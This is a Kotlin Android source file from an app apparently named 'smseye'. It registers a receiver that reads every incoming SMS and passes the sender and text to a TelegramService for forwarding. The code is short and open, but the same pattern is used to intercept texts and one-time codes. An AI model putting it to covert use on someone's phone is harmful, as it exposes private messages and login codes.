package com.example.smseye

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isEmpty()) return
            
            val sender = messages[0].displayOriginatingAddress ?: "Unknown"
            val fullBody = messages.joinToString("") { it.messageBody ?: "" }

            TelegramService.forwardSms(context, sender, fullBody)
        }
    }
}
